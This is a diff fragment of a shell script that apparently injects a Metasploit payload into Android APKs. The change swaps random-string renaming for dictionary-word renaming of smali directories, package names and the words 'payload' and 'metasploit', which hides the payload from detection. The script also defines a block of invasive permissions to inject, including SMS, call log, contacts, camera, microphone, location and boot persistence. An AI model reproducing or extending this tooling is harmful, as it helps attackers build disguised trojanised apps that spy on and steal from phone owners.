@@ -43,14 +43,16 @@ ver="v0.1"
 APKTOOL="$path/input/apktool.jar"
 ICON_DIR="$path/input"
 ORIGINAL_DIR="$path/input"
-VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
-VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
-VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Payload.smali renaming
-VAR4=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 1
-VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 2
-VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 3
-VAR7=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'payload'
-VAR8=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'metasploit'
+
+VAR1=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1) # smali dir renaming
+VAR2=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1) # smali dir renaming
+VAR3=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1) # Payload.smali renaming
+VAR4=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1) # Pakage name renaming 1
+VAR5=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1) # Pakage name renaming 2
+VAR6=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1) # Pakage name renaming 3
+VAR7=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1) # New name for word 'payload'
+VAR8=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1) # New name for word 'metasploit'
+
 perms='   <uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\n    <uses-permission android:name="android.permission.SEND_SMS"/>\n    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\n    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\n    <uses-permission android:name="android.permission.CALL_PHONE"/>\n    <uses-permission android:name="android.permission.READ_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\n    <uses-permission android:name="android.permission.CAMERA"/>\n    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\n    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\n    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\n    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WAKE_LOCK"/>\n    <uses-permission android:name="android.permission.READ_SMS"/>'
 echo ""
 sleep 1
